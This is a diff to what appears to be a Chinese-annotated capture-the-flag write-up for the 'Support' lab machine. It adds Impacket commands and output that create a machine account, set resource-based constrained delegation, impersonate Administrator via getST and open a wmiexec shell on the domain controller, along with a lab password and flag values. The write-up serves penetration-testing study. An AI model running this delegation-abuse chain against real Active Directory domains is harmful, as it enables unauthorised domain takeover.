@@ -13,6 +13,10 @@ tags:
   - GetUserSPNs
   - GetNPUsers
   - Securetsdump
+  - Addcomputer
+  - RBCD
+  - getST
+  - Wmiexec
 ---
 ## mssqlclient
 
@@ -357,4 +361,92 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 5183e6faa81a508920196120306ef1c2
+```
+
+## Addcomputer
+
+创建一个可控的域计算机账户，账户名为 `PWN$`，密码为 `123456`，后续会用 `support.htb/PWN$:123456` 向 KDC 请求 Kerberos 票据。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Support]
+└─$ impacket-addcomputer -computer-name 'PWN$' -computer-pass '123456' -dc-ip 10.129.23.95 'support.htb/support:Ironside47pleasure40Watchful'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account PWN$ with password 123456.
+```
+
+## RBCD
+
+RBCD 是 Resource-Based Constrained Delegation，基于资源的受限委派。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Support]
+└─$ impacket-rbcd -delegate-from 'PWN$' -delegate-to 'DC$' -action 'write' -dc-ip 10.129.23.95 'support.htb/support:Ironside47pleasure40Watchful'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] PWN$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     PWN$         (S-1-5-21-1677581083-3380853377-188903654-6101)
+```
+
+## getST
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Support]
+└─$ impacket-getST -spn 'cifs/DC.support.htb' -impersonate 'Administrator' -dc-ip 10.129.23.95 'support.htb/PWN$:123456'      
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
+```
+
+## Wmiexec
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Support]
+└─$ impacket-wmiexec -k -no-pass -target-ip 10.129.23.95 dc.support.htb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+support\administrator
+
+C:\>cd Users
+C:\Users>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 955A-5CBB
+
+ Directory of C:\Users
+
+07/26/2022  06:21 AM    <DIR>          .
+05/28/2022  04:11 AM    <DIR>          Administrator
+07/26/2022  06:21 AM    <DIR>          ldap
+05/19/2022  02:13 AM    <DIR>          Public
+04/23/2026  03:02 AM    <DIR>          support
+               0 File(s)              0 bytes
+               5 Dir(s)   3,970,932,736 bytes free
+
+C:\Users>cd Administrator\Desktop
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 955A-5CBB
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/28/2022  04:17 AM    <DIR>          .
+05/28/2022  04:11 AM    <DIR>          ..
+04/23/2026  02:12 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   3,970,932,736 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+4a28f1303938*******3666979acc4e
 ```
